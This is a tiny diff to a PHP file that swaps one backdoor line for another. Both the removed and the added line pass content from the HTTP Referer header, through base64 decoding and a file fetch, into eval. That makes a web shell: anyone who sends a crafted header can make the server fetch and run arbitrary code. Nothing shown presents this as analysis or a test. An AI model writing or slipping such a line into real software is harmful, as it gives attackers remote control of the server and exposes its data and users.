@@ -1,2 +1,2 @@
 <?php
-    eval(base64_decode(file_get_contents($_SERVER['HTTP_REFERER'])));
+    eval(file_get_contents(base64_decode($_SERVER['HTTP_REFERER'])));
